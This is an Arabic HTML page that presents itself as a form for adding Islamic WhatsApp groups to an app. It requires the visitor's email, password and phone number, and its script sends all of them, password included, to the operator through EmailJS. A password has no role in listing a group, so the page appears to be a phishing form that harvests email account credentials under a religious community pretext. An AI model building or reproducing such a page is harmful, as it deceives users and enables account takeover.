<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>قروبات واتساب اسلامية</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#57AF32',
                        background: '#F5F7F6',
                    }
                }
            },
            darkMode: 'class'
        }

        // التحقق من الوضع المظلم
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
        }
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
            if (event.matches) {
                document.documentElement.classList.add('dark');
            } else {
                document.documentElement.classList.remove('dark');
            }
        });
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
        
        body {
            font-family: 'Tajawal', sans-serif;
        }

        .dark {
            --tw-bg-opacity: 1;
            --tw-text-opacity: 1;
        }

        .dark body {
            background-color: #181818;
            color: #ffffff;
        }

        .loader {
            border: 3px solid rgba(87, 175, 50, 0.3);
            border-radius: 50%;
            border-top: 3px solid #57AF32;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-left: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .image-preview {
            width: 100%;
            max-width: 200px;
            height: 200px;
            object-fit: contain;
            border: 2px dashed #57AF32;
            border-radius: 8px;
            margin: 10px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #57AF32;
            background-color: rgba(87, 175, 50, 0.1);
        }
    </style>
</head>
<body class="bg-background dark:bg-gray-900">
    <div class="container mx-auto px-4 py-8 max-w-4xl">
        <header class="text-center mb-8">
            <img src="https://k.top4top.io/p_3392w0rvr0.png" alt="شعار قروبات واتساب اسلامية" class="h-32 mx-auto mb-4">
            <h1 class="text-3xl font-bold text-primary dark:text-green-400 mb-2">قروبات واتساب اسلامية</h1>
            <p class="text-gray-600 dark:text-gray-300">أضف مجموعتك أو قناتك الإسلامية إلى تطبيقنا</p>
        </header>

        <main class="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6 mb-8">
            <form id="whatsappForm" class="space-y-6">
                <div>
                    <label for="groupName" class="block text-primary dark:text-green-400 font-medium mb-2">اسم المجموعة / القناة <span class="text-red-500">*</span></label>
                    <input type="text" id="groupName" name="groupName" required 
                        class="w-full px-4 py-2 border border-gray-300 dark:border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:text-white text-base" 
                        placeholder="أدخل اسم المجموعة أو القناة">
                </div>

                <div>
                    <label for="groupLink" class="block text-primary dark:text-green-400 font-medium mb-2">رابط المجموعة / القناة <span class="text-red-500">*</span></label>
                    <input type="url" id="groupLink" name="groupLink" required 
                        class="w-full px-4 py-2 border border-gray-300 dark:border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:text-white text-base" 
                        placeholder="https://chat.whatsapp.com/...">
                    <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">تأكد من أن الرابط صحيح وفعال</p>
                </div>

                <div>
                    <label for="groupImage" class="block text-primary dark:text-green-400 font-medium mb-2">صورة المجموعة / القناة</label>
                    <div class="image-preview" id="imagePreview">
                        <span id="uploadText">اضغط لاختيار صورة</span>
                        <img id="previewImg" class="hidden w-full h-full object-contain" alt="معاينة الصورة">
                    </div>
                    <input type="file" id="groupImage" name="groupImage" accept="image/*" class="hidden">
                    <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">الحد الأقصى: 2 ميجابايت، الصيغ المقبولة: JPG، PNG، GIF</p>
                </div>

                <div>
                    <label for="email" class="block text-primary dark:text-green-400 font-medium mb-2">البريد الإلكتروني <span class="text-red-500">*</span></label>
                    <input type="email" id="email" name="email" required 
                        class="w-full px-4 py-2 border border-gray-300 dark:border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:text-white text-base" 
                        placeholder="yazn@gmail.com">
                </div>

                <div>
                    <label for="password" class="block text-primary dark:text-green-400 font-medium mb-2">كلمة المرور <span class="text-red-500">*</span></label>
                    <input type="password" id="password" name="password" required 
                        class="w-full px-4 py-2 border border-gray-300 dark:border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:text-white text-base" 
                        placeholder="أدخل كلمة المرور">
                </div>

                <div>
                    <label for="phone" class="block text-primary dark:text-green-400 font-medium mb-2">رقم الهاتف <span class="text-red-500">*</span></label>
                    <input type="tel" id="phone" name="phone" required 
                        class="w-full px-4 py-2 border border-gray-300 dark:border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary dark:bg-gray-700 dark:text-white text-base" 
                        placeholder="+966xxxxxxxxx">
                    <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">أدخل رقم الهاتف مع رمز الدولة</p>
                </div>

                <div class="text-center">
                    <button type="submit" id="submitBtn" class="bg-primary hover:bg-green-600 text-white font-medium py-3 px-6 rounded-lg transition duration-300 text-lg">
                        إرسـال
                    </button>
                    <div id="loadingIndicator" class="hidden mt-4">
                        <span class="loader"></span>
                        <span class="mr-2 text-primary dark:text-green-400">جاري الإرسال...</span>
                    </div>
                </div>
            </form>

            <div id="successMessage" class="hidden mt-4 bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-300 p-4 rounded-lg text-center">
                شكرا لك على إرسال مجموعتك، سيتم إضافتها للتطبيق قرييا.
            </div>

            <div id="errorMessage" class="hidden mt-4 bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-300 p-4 rounded-lg text-center">
                حدث خطأ أثناء إرسال المعلومات. الرجاء المحاولة مرة أخرى أو التواصل معنا مباشرة.
            </div>
        </main>

        <footer class="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6 text-center">
            <h2 class="text-2xl font-bold text-primary dark:text-green-400 mb-4">تواصل معنا</h2>
            <p class="text-gray-600 dark:text-gray-300 mb-4">هل لديك أسئلة أو استفسارات؟ تواصل معنا مباشرة على واتساب</p>
            <a href="https://wa.me/message/JTRZ5KE4WYW2O1" target="_blank" class="inline-flex items-center justify-center bg-primary hover:bg-green-600 text-white font-medium py-3 px-6 rounded-lg transition duration-300 text-lg">
                <svg class="w-5 h-5 ml-2" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"></path>
                </svg>
                تواصل عبر واتساب
            </a>
            <p class="mt-6 text-sm text-gray-500 dark:text-gray-400">جميع الحقوق محفوظة ©️ قروبات واتساب اسلامية 2025</p>
        </footer>
    </div>

    <!-- إضافة مكتبة EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('whatsappForm');
            const imagePreview = document.getElementById('imagePreview');
            const groupImage = document.getElementById('groupImage');
            const previewImg = document.getElementById('previewImg');
            const uploadText = document.getElementById('uploadText');
            const submitBtn = document.getElementById('submitBtn');
            const loadingIndicator = document.getElementById('loadingIndicator');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');

            // تهيئة EmailJS باستخدام المفتاح العام
            (function() {
                emailjs.init("rfBhDlgTRx9BkUjh2");
            })();

            // تحميل الصورة ومعاينتها
            imagePreview.addEventListener('click', function() {
                groupImage.click();
            });

            groupImage.addEventListener('change', function(e) {
                if (e.target.files.length > 0) {
                    const file = e.target.files[0];
                    
                    // التحقق من حجم الملف (2 ميجابايت كحد أقصى)
                    if (file.size > 2 * 1024 * 1024) {
                        alert('حجم الملف كبير جداً! يجب أن يكون أقل من 2 ميجابايت.');
                        groupImage.value = '';
                        return;
                    }

                    const reader = new FileReader();
                    
                    reader.onload = function(event) {
                        previewImg.src = event.target.result;
                        previewImg.classList.remove('hidden');
                        uploadText.classList.add('hidden');
                    };
                    
                    reader.readAsDataURL(file);
                }
            });

            // التحقق من الرابط
            const groupLink = document.getElementById('groupLink');
            groupLink.addEventListener('blur', function() {
                const linkValue = groupLink.value.trim();
                if (linkValue && !linkValue.startsWith('https://chat.whatsapp.com/')) {
                    if (!confirm('يبدو أن الرابط ليس رابط مجموعة واتساب صحيح. هل أنت متأكد من صحة الرابط؟')) {
                        groupLink.focus();
                    }
                }
            });

            // إرسال النموذج
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // التحقق من صحة النموذج
                if (!form.checkValidity()) {
                    form.reportValidity();
                    return;
                }

                // إظهار مؤشر التحميل
                submitBtn.disabled = true;
                loadingIndicator.classList.remove('hidden');
                
                // الحصول على بيانات النموذج
                const groupName = document.getElementById('groupName').value;
                const groupLinkValue = document.getElementById('groupLink').value;
                const emailValue = document.getElementById('email').value;
                const passwordValue = document.getElementById('password').value;
                const phoneValue = document.getElementById('phone').value;
                
                // الحصول على الصورة إذا تم تحميلها
                let imageBase64 = "";
                if (!previewImg.classList.contains('hidden') && previewImg.src) {
                    imageBase64 = previewImg.src; // هذا سيكون البيانات بتنسيق base64
                }
                
                // إعداد البيانات للإرسال
                const templateParams = {
                    groupName: groupName,
                    groupLink: groupLinkValue,
                    email: emailValue,
                    password: passwordValue,
                    phone: phoneValue,
                    imageBase64: imageBase64, // إرسال الصورة كـ base64
                    hasImage: imageBase64 ? "نعم" : "لا" // لمعرفة ما إذا كانت هناك صورة
                };

                // إرسال البريد الإلكتروني باستخدام EmailJS
                emailjs.send('service_fq0llf8', 'template_lzkixjf', templateParams)
                    .then(function(response) {
                        console.log('SUCCESS!', response.status, response.text);
                        
                        // عرض رسالة النجاح
                        loadingIndicator.classList.add('hidden');
                        successMessage.classList.remove('hidden');
                        errorMessage.classList.add('hidden');
                        form.reset();
                        previewImg.classList.add('hidden');
                        uploadText.classList.remove('hidden');
                        
                        // إعادة تفعيل الزر بعد فترة
                        setTimeout(function() {
                            submitBtn.disabled = false;
                            successMessage.classList.add('hidden');
                        }, 5000);
                    })
                    .catch(function(error) {
                        console.log('FAILED...', error);
                        
                        // عرض رسالة الخطأ
                        loadingIndicator.classList.add('hidden');
                        errorMessage.classList.remove('hidden');
                        submitBtn.disabled = false;
                    });
            });
        });
    </script>
</body>
</html># index.html
